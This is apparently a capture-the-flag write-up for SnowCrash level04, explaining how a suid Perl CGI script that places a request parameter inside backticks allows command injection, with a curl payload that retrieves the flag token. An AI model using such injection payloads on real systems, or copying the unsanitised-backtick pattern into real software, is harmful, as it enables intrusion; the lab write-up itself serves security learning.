## --------------> Vulnerability

Privilege escalation via CGI code injection


We have a perl script in our home directory that is owned by flag04 and has the suid/guid bit set
which means it will be executed with the rights of its owner (flag04)

```
level04@SnowCrash:~$ ls -la level04.pl
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Reading the contents of the file reveals that it is intended to run the Apache server on port 4747

```
# Indicates the path of the interpreter, like for bash (#!/bin/bash)
!/usr/bin/perl                        
# This program is executed from a web server hosted on local machine and reachable via the port 4747
localhost:4747
# In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests
use CGI qw{param};
# Print the string when it's execute
print "Content-type: text/html\n\n";   
#Define function 'x' Variable 'y' take the value of the variable passed as parameter
#Print variable 'y' ('2>&1' is for error handling) Call function 'x'
sub x {                             
  $y = $_[0];               
  print `echo $y 2>&1`; 
}
x(param("x"));

```

As we can see in the code above, it will display the command output using 'echo'. In other words, it will display the value of the variable 'x' that has been supplied as an argument!

```
level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password:
level05@SnowCrash:~$
```
